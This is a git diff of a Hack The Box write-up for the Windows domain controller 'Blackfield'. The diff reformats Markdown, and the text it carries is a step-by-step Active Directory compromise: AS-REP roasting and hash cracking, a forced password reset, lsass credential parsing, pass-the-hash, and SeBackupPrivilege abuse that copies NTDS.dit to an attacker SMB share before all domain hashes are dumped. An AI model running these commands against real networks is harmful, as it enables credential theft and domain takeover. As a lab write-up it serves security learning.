@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/b4a512649abdabffa2cb7717f6e9e1de9a034e4c/windows-machines/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -24,7 +24,7 @@ I started my enumeration with an nmap scan of `10.10.10.192`. The options I regu
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ nmap -n -v -p- -sCV -oA blackfield 10.10.10.192 -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 11:28 EDT
@@ -104,9 +104,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 290.20 seconds
 ```
 
-Since port 445 (SMB) is open I tried to enumerate open shares by using anonymous login with smbclient and got a list of shares!
+Since port 445 \(SMB\) is open I tried to enumerate open shares by using anonymous login with smbclient and got a list of shares!
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U "" -L \\\\10.10.10.192\\       
 Enter WORKGROUP\'s password: 
@@ -123,8 +123,7 @@ Enter WORKGROUP\'s password:
 SMB1 disabled -- no workgroup available
 ```
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U ""  \\\\10.10.10.192\\forensic
 Enter WORKGROUP\'s password: 
@@ -132,11 +131,10 @@ Try "help" to get a list of possible commands.
 smb: \> ls
 NT_STATUS_ACCESS_DENIED listing \*
 ```
+
 I was able to login to the `forensic` share anonymously but was not allowed to do much
 
-
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U ""  \\\\10.10.10.192\\profiles$
 Enter WORKGROUP\'s password: 
@@ -461,27 +459,28 @@ smb: \> ls
 
                 7846143 blocks of size 4096. 4006940 blocks available
 ```
-Trying again with the `profiles$` share yeilded a lot more information!  I took all of the these usernames and added them to a list.
 
-I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` kerberos user enumeration tool, however I just got an error for each user saying `[*] 10.10.10.193:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
-(Based on later information, I think the correct domain name to use may have been BLACKFIELD.local)
+Trying again with the `profiles$` share yeilded a lot more information! I took all of the these usernames and added them to a list.
 
-```
+I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` kerberos user enumeration tool, however I just got an error for each user saying `[*] 10.10.10.193:88 - Wrong DOMAIN Name? Check DOMAIN and retry...` \(Based on later information, I think the correct domain name to use may have been BLACKFIELD.local\)
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ rpcclient -U "" -N  10.10.10.192                                                                1 ⨯
 rpcclient $> enumdomusers
 result was NT_STATUS_ACCESS_DENIED
 rpcclient $> getdcname blackfield
 \\DC01
-
 ```
-After trying numerous commands, I was able to at least verify that blackfield was indeed the correct domain name. 
+
+After trying numerous commands, I was able to at least verify that blackfield was indeed the correct domain name.
 
 since the module in msfconsole didn't I decided to try the python-based Impacket script `GetNPUsers.py` which does the same type of check to see if any users have `UF_DONT_REQUIRE_PREAUTH` turned off.
-```
+
+```text
 ┌──(zweilos㉿kali)-[~/impacket/examples]
 └─$ python3 ./GetNPUsers.py blackfield/ -no-pass -usersfile ~/htb/blackfield/usernames -dc-ip 10.10.10.192 > kerberosEnum
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/impacket/examples]
 └─$ cat kerberosEnum | grep -v UNKNOWN   
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -490,9 +489,10 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 $krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde139decbebfad063e7609dab33b33273e9ceb5668dc6e1d8bacc94142deb2f370f523d9a0597d552a72b6c5af467fa4ddbacf4a989f6c79f4d1f303103582b9bbc0626aa78ad60a47d38070da94cb3489a9915a9470fbc30ef80f3835691d86e30ec0269f2220f35a567bb1d344cfde7dc83d6e1c18f7d7f52f5d6bd22d62621c833b609205c7f42d4e3138007bd584f8828331a0180718ef3b6e3d93de7ce69142b4ca78b8a1f9e891ae494bacb9d3dd4d93b3e8cab02e4be01ce934634491e836d2b5450ff841e0221d3470e44d5876071447a55885aa80a3a11de423f89f1c1baa20898267bc7e
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
+
 I found three users that had this turned off, and one even had the password hash attached! Time to fire up hashcat.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/impacket/examples]
 └─$ hashcat --help | grep -i kerberos                                                               1 ⨯
    7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
@@ -502,7 +502,7 @@ I found three users that had this turned off, and one even had the password hash
   19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
   19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
   19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/impacket/examples]
 └─$ hashcat -O -D1,2 -a0 -m 18200 support.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.1.1) starting...
@@ -516,7 +516,7 @@ Dictionary cache hit:
 Approaching final keyspace - workload adjusted.  
 
 $krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde139decbebfad063e7609dab33b33273e9ceb5668dc6e1d8bacc94142deb2f370f523d9a0597d552a72b6c5af467fa4ddbacf4a989f6c79f4d1f303103582b9bbc0626aa78ad60a47d38070da94cb3489a9915a9470fbc30ef80f3835691d86e30ec0269f2220f35a567bb1d344cfde7dc83d6e1c18f7d7f52f5d6bd22d62621c833b609205c7f42d4e3138007bd584f8828331a0180718ef3b6e3d93de7ce69142b4ca78b8a1f9e891ae494bacb9d3dd4d93b3e8cab02e4be01ce934634491e836d2b5450ff841e0221d3470e44d5876071447a55885aa80a3a11de423f89f1c1baa20898267bc7e:#00^BlackKnight
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Kerberos 5, etype 23, AS-REP
@@ -536,13 +536,14 @@ Candidates.#1....: $HEX[2626494c4f5645594f55] -> $HEX[042a0337c2a156616d6f732103
 Started: Sat Oct  3 13:48:43 2020
 Stopped: Sat Oct  3 13:49:04 2020
 ```
+
 After searching for the correct hashtype I fired up hashcat and very quickly cracked the password using the `rockyou.txt` wordlist. The password for support was `#00^BlackKnight`
 
 ## Initial Foothold
 
 ## Road to User
 
-```
+```text
 ┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
 └─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -556,20 +557,21 @@ SMB         10.10.10.192    445    DC01             forensic                    
 SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
 SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.10.10.192    445    DC01             profiles$       READ            
-SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
 ```
-The user `support` could view the same shares as I could see anonymously.  Next I tried to see if this user could get any more information from them.
+
+The user `support` could view the same shares as I could see anonymously. Next I tried to see if this user could get any more information from them.
 
 I connected to each of the three shares: profiles$ still had the same empty user directories, NETLOGON was completely empty. SYSVOL had a few files, but none of them contained anything useful.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h 10.10.10.192 -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
 ```
 
-I ran ldapsearch next to see if I could get any more information than before, and a mountain of data returned.  (I also made the mistake of not sending the output to a file the first time and my screen exploded). Unfortunately, there was nothing new or useful in all of that the output (besides a slew of anonymous sounding usernames such as blackfield123456, etc.)
+I ran ldapsearch next to see if I could get any more information than before, and a mountain of data returned. \(I also made the mistake of not sending the output to a file the first time and my screen exploded\). Unfortunately, there was nothing new or useful in all of that the output \(besides a slew of anonymous sounding usernames such as blackfield123456, etc.\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
 INFO: Found AD domain: blackfield.local
@@ -587,11 +589,11 @@ INFO: Querying computer: DC01.BLACKFIELD.local
 INFO: Done in 00M 10S
 ```
 
-With so many users to go off and no way to directly tell what rights I had with the user `support` I loaded bloodhound up to see if it could sniff me a path forward.  The python version of bloodhound allows it to be run against a remote host with credentials, and outputs a few `.json` files that I imported into the main program.
+With so many users to go off and no way to directly tell what rights I had with the user `support` I loaded bloodhound up to see if it could sniff me a path forward. The python version of bloodhound allows it to be run against a remote host with credentials, and outputs a few `.json` files that I imported into the main program.
 
-![](picture)
+![](https://github.com/zweilosec/htb-writeups/tree/b4a512649abdabffa2cb7717f6e9e1de9a034e4c/windows-machines/picture)
 
-Bloodhound reported 314 (!)  users on this domain.  Most of them were named generically `BLACKFIELD123456`, however there were a few that stuck out. I set these as my targets and began looking for ways to link them.
+Bloodhound reported 314 \(!\) users on this domain. Most of them were named generically `BLACKFIELD123456`, however there were a few that stuck out. I set these as my targets and began looking for ways to link them.
 
 Since I already had the credentials for `support` I marked that user as 'owned' and proceeded to see what I could do with its access.
 
@@ -599,15 +601,15 @@ Picture
 
 Since `support` has the `ForceChangePassword` privilege over the user `audit2020`
 
-I looked up how to change a user's password via SMB and found:
-https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/
+I looked up how to change a user's password via SMB and found: [https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/](https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/)
 
-Unfortunately this did not work, so I did some searching to see if there was another way to do it remotely. I found a shady looking site that explained what I was looking for using RPC at https://malicious.link/post/2017/reset-ad-user-password-with-linux/ (it was mixed in the middle of a bunch of those scam/malware .it sites so I was a bit leary at first.)
+Unfortunately this did not work, so I did some searching to see if there was another way to do it remotely. I found a shady looking site that explained what I was looking for using RPC at [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) \(it was mixed in the middle of a bunch of those scam/malware .it sites so I was a bit leary at first.\)
 
-This site showed that using rpcclient with the sysntax `rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'` you could change a user's password without knowing the current one.  It linked to a MSDN site which explained why to use `23` for the property. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
+This site showed that using rpcclient with the sysntax `rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'` you could change a user's password without knowing the current one. It linked to a MSDN site which explained why to use `23` for the property. [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
 
 3 pictures
-```
+
+```text
 The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.
 
  typedef struct _SAMPR_USER_INTERNAL4_INFORMATION {
@@ -617,7 +619,7 @@ The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, a
   *PSAMPR_USER_INTERNAL4_INFORMATION;
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
 └─$ rpcclient -U BLACKFIELD/support 10.10.10.192
 Enter BLACKFIELD\support's password: 
@@ -640,17 +642,19 @@ password_properties: 0x00000001
         DOMAIN_PASSWORD_COMPLEX
 rpcclient $> setuserinfo audit2020 23 TestPass!23
 ```
-I also tried doing it the 'easy' way with the one-liner at the bottom of the blog post and successfully changed it with the `net` command.  I'll definitely have to remember that I can use `net` commands from Linux in the future!
 
-```
+I also tried doing it the 'easy' way with the one-liner at the bottom of the blog post and successfully changed it with the `net` command. I'll definitely have to remember that I can use `net` commands from Linux in the future!
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ net rpc password audit2020 -U support -S 10.10.10.192  
 Enter new password for audit2020:
 Enter WORKGROUP\support's password:
 ```
-now that I had a usable password for another user I set out to see what I could get into.  I was unable to use WinRM or get anything further from rpcclient, so I went back to enumerating the open SMB shares.
 
-```
+now that I had a usable password for another user I set out to see what I could get into. I was unable to use WinRM or get anything further from rpcclient, so I went back to enumerating the open SMB shares.
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ smbclient -W BLACKFIELD -U "audit2020"  \\\\10.10.10.192\\forensic 'TestPass!23'
 Try "help" to get a list of possible commands.
@@ -727,7 +731,7 @@ smb: \tools\> ls
                 7846143 blocks of size 4096. 3994160 blocks available
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ pypykatz lsa minidump lsass.DMP                                                  
 INFO:root:Parsing file lsass.DMP
@@ -803,25 +807,25 @@ luid 153705
                 sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
 ```
 
-ran mimikatz - python edition (`pypykatz`) on the  lssas.DMP file, then pulled out the usernames, passwords, and hashes
+ran mimikatz - python edition \(`pypykatz`\) on the lssas.DMP file, then pulled out the usernames, passwords, and hashes
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i username | cut -d '"' -f4 |sort | uniq >> usernames 
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i password | cut -d '"' -f4 |sort | uniq >> passwords
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ vim passwords 
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i nthash | cut -d '"' -f4 |sort | uniq >> hashes
 ```
 
-I tried cracking the NTLM hashes with `hashcat` but even using all of the various rules and some basic mangles I was unsiccessful.  Luckily since this is Windows domain I can try to do a pass-the-hash attack instead.
+I tried cracking the NTLM hashes with `hashcat` but even using all of the various rules and some basic mangles I was unsiccessful. Luckily since this is Windows domain I can try to do a pass-the-hash attack instead.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ crackmapexec smb 10.10.10.192 -u targets -H hashes -o cme.status   
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -832,15 +836,13 @@ SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_bac
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-It didn't take long to find a valid combination.  The password (hash) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Luckily for me, this user is in the Windows Remote Management group, and port 5985 for WinRM was open.  I tried using evil-winRM and was logged in with a shell.
-
-
+It didn't take long to find a valid combination. The password \(hash\) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Luckily for me, this user is in the Windows Remote Management group, and port 5985 for WinRM was open. I tried using evil-winRM and was logged in with a shell.
 
 ### Further enumeration
 
 ### Finding user creds
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
 
@@ -895,13 +897,12 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
-Imediately after logging in I knew I had a privilege escalation path.  Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its even easier having both!
 
-
+Imediately after logging in I knew I had a privilege escalation path. Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its even easier having both!
 
 ### User.txt
 
-```
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls
 
@@ -922,7 +923,7 @@ Mode                LastWriteTime         Length Name
 
 ### Enumeration as User `svc_backup`
 
-```
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b C:\Users\Administrator\Desktop\ ./
 
 -------------------------------------------------------------------------------
@@ -953,9 +954,10 @@ Mode                LastWriteTime         Length Name
 2020/10/05 01:25:49 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
 Access is denied.
 ```
-So much for the easy way to get the flag.  with the SeBackupPrivilege I should have the ability to backup any file, but it lookds like there was something limiting it.  I did get a file `notes.txt`
 
-```
+So much for the easy way to get the flag. with the SeBackupPrivilege I should have the ability to backup any file, but it lookds like there was something limiting it. I did get a file `notes.txt`
+
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat notes.txt
 Mates,
 
@@ -970,15 +972,16 @@ We will probably have to backup & restore things later.
 
 PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
 ```
-So the "audit report" (root.txt) is encrypted.  That would explain why it cannot be copied directly.  I guess I have to privesc first.  Searching for `SeBackupPrivilege` led me to https://github.com/giuliano108/SeBackupPrivilege. 
 
-```
+So the "audit report" \(root.txt\) is encrypted. That would explain why it cannot be copied directly. I guess I have to privesc first. Searching for `SeBackupPrivilege` led me to [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege).
+
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilege
 SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll    
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeCmdLets.dll
 Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeCmdLets.dll                                                                                                    
 
-                                                             
+
 Data: 16384 bytes of 16384 bytes copied
 
 Info: Upload successful!
@@ -986,13 +989,13 @@ Info: Upload successful!
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeUtils.dll
 Info: Uploading SeBackupPrivilegeUtils.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeUtils.dll
 
-                                                             
+
 Data: 21844 bytes of 21844 bytes copied
 
 Info: Upload successful!
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ sudo smbserver.py share . -smb2support -username test -password test   
 
@@ -1004,12 +1007,11 @@ Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corpo
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed
-
 ```
-created a samba share using impacket to copy over my loot
-https://pentestlab.blog/tag/diskshadow/
 
-```
+created a samba share using impacket to copy over my loot [https://pentestlab.blog/tag/diskshadow/](https://pentestlab.blog/tag/diskshadow/)
+
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> net use z: \\10.10.15.132\share /USER:test test
 The command completed successfully.
 
@@ -1034,9 +1036,10 @@ This will back up (C:) (Selected Files) to \\10.10.15.132\\share.
 
 A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS.
 ```
-Unfortunately it wont' back up to a drive that is not formatted with NTFS, and wont backup to the same drive letter.  
 
-```
+Unfortunately it wont' back up to a drive that is not formatted with NTFS, and wont backup to the same drive letter.
+
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:\\dc01\c$\users\svc_backup\
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
@@ -1069,9 +1072,10 @@ The backup of volume (C:) completed successfully.
 Log of files successfully backed up:
 C:\Windows\Logs\WindowsServerBackup\Backup-05-10-2020_09-19-43.log
 ```
-It took a bit of research and troubleshooting, but I found a workaround, in the form of using the network path for the local drive instead of the drive letter.  Now I just had to restore my backup to a location I controlled and exfiltrate the file.  I would also have to exfil the SYSTEM hive as well.
 
-```
+It took a bit of research and troubleshooting, but I found a workaround, in the form of using the network path for the local drive instead of the drive letter. Now I just had to restore my backup to a location I controlled and exfiltrate the file. I would also have to exfil the SYSTEM hive as well.
+
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
@@ -1086,9 +1090,10 @@ Backup location: Network Share labeled \\dc01\c$\users\svc_backup\
 Version identifier: 10/05/2020-09:19
 Can recover: Volume(s), File(s)
 ```
+
 First I had to get the version identifier of the backup. It seemed like there was already a backup that had been made to `10.10.14.4\blackfieldA\` on 9/21/2020.
 
-```
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -quiet -version:10/05/2020-09:19 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\Users\svc_backup\Documents -notrestoreacl
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
@@ -1112,11 +1117,11 @@ Log of files successfully recovered:
 C:\Windows\Logs\WindowsServerBackup\FileRestore-05-10-2020_09-27-38.log
 ```
 
-```
+```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download NTDS.dit
 Info: Downloading C:\Users\svc_backup\Documents\NTDS.dit to NTDS.dit
 
-                                                             
+
 Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM ./
@@ -1138,25 +1143,26 @@ reg.exe : ERROR: Access is denied.
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download system.hive
 Info: Downloading C:\Users\svc_backup\Documents\system.hive to system.hive
 
-                                                             
+
 Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download sam.hive
 Info: Downloading C:\Users\svc_backup\Documents\sam.hive to sam.hive
 
-                                                             
+
 Info: Download successful!
 ```
-Next I saved each of the registry hives and downloaded all of the files.  Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes
+
+Next I saved each of the registry hives and downloaded all of the files. Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes
 
 ### Getting a shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ secretsdump.py -system system.hive -sam sam.hive -ntds NTDS.dit LOCAL | tee blackfield.hashes
 
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
-  
+
 [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Searching for pekList, be patient
@@ -1170,10 +1176,10 @@ audit2020:1103:aad3b435b51404eeaad3b435b51404ee:30ccd2d5d879d9de6c5a39a5b8cc6165
 support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
 ...snipped...
 ```
-Using Impacket's secretsdump.py I was able to dump the password hashes for all of the domain users (including the 300+ Blackfield123456 users!)
 
+Using Impacket's secretsdump.py I was able to dump the password hashes for all of the domain users \(including the 300+ Blackfield123456 users!\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee                1 ⨯
 
@@ -1263,7 +1269,7 @@ d-----        2/23/2020   5:03 AM                forensic
 
 Evil-WinRM* PS C:\Users\Administrator\Documents> download watcher.ps1
 Info: Downloading C:\Users\Administrator\Documents\watcher.ps1 to watcher.ps1
-                                                             
+
 Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
@@ -1274,9 +1280,9 @@ c1cbe908dad337d81c58845ccd092e83
 
 ### Root.txt
 
-After collecting the flag, I went to verify the reason that I was unable to back up `root.txt`.  
+After collecting the flag, I went to verify the reason that I was unable to back up `root.txt`.
 
-```
+```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cipher.exe /C
 
  Listing C:\Users\Administrator\Desktop\
@@ -1295,18 +1301,21 @@ Access is denied.
 
 Access is denied.
 ```
-Using the `cipher.exe` command I was indeed able to see that the file was encrypted.  The PowerShell script `watcher.ps1` that I had seen earlier in the Administrator's documents folder when I logged in was the reason.
 
-```powershell
+Using the `cipher.exe` command I was indeed able to see that the file was encrypted. The PowerShell script `watcher.ps1` that I had seen earlier in the Administrator's documents folder when I logged in was the reason.
+
+```text
 sleep 30
-  
+
 $file = "C:\Users\Administrator\Desktop\root.txt"
 $command = "(Get-Item -Path $file).Encrypt()"
 
 Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
 ```
+
 The script `watcher.ps1` is the reason that root.txt was encrypted
 
 Thanks to [`aas`](https://www.hackthebox.eu/home/users/profile/6259) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
